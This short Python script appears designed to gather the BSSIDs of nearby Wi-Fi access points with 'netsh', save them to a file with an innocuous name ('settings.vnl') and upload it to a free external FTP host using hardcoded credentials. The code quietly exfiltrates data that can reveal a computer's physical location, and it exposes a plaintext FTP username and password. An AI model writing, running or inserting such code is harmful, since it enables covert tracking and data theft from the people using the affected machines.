import os, time
from ftplib import FTP
# netsh wlan show all  | find "BSSID" - find  BSSID only of near AP
# netsh wlan show interfaces | find "BSSID" - find BSSID only connected AP

f = open('settings.vnl', 'w')
f.write("""BSSID of near AP 
""")
netsh = os.popen('netsh wlan show all  | find "BSSID"')
for id in netsh.readlines():
    f.write(id)
f.close()
from ftplib import FTP
ftp = FTP('ftpupload.net')
ftp.login(user="epiz_32209791",passwd="549qg0NEFZxz8R")
ftp.cwd(dirname="htdocs")
path="settings.vnl"
with open(path, 'rb') as fobj:
    ftp.storbinary('STOR ' + path, fobj, 1024)